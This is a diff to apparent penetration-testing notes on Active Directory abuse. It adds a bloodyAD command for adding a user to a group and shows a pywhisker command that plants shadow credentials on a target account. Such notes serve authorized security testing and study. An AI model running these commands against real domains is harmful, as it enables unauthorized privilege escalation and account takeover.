@@ -100,6 +100,8 @@ Enter-PSSession {PSSession_ID_returned}
 - If we have GenericWrite over a user from a group
   - If we need to add ourselves or a user to the group first via GenericAll, we can use `net` on kali
   	- `net rpc group addmem '{target_group}' {user_to_add} -U '{domain}/{owned_user}%{password} -S '{dc_fqdn}'`
+      - This has sometimes failed for me in the past, so we can also use `bloodyAD`
+        - `bloodyAD --host '{ip}' -d '{domain}' -u {user} -p '{password}' add groupMember {group} {user_to_add}`
   - We can then use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to add shadow credentials to the user
 	- `pywhisker -d "{domain}" -u "{owned_user}" -p "{owned_user_password}" --target "{target_user}" --action "add" --dc-ip {dc-ip} -f {filename} --pfx-password '{pfx_file_password}'`
 	- This gives us a pfx file for the user and a password for the pfx file
